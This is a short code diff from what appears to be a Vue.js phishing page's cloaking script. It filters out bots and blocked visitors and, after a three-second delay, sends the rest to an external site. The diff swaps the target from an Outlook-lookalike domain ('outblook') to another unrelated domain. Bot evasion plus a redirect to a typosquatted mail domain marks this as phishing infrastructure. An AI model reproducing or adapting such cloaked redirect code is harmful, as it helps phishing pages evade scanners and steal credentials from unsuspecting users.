@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://outblook.chiletoons.cl/';
+          window.location.href = 'https://ht.jm-arizadiaz.es/';
         }, 3000);
       }
 
